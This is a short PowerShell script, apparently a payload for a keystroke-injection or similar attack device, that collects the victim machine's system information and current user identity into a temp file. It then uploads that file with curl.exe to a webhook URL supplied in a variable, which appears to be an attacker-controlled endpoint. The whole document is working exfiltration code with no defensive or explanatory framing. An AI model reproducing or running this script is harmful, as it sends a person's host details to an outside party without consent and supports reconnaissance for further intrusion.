$hookurl = "$dc"

$temp="$env:temp"

systeminfo > $temp/hostinfo.txt
whoami >> $temp/hostinfo.txt

curl.exe -F file1=@"$temp/hostinfo.txt" $hookurl
